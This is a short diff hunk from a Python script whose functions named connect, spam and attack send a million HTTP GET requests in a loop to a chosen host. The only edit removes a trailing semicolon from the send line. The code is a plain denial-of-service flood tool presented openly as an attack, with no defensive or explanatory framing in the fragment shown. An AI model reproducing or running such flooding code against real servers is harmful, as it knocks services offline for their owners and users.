@@ -7,7 +7,7 @@ def connect(host, port):
 
 def spam(sock, host):
     for i in range(1000000):
-        sock.send("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n");
+        sock.send("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
     
 def attack(host, port):
     sock = connect(host, port)
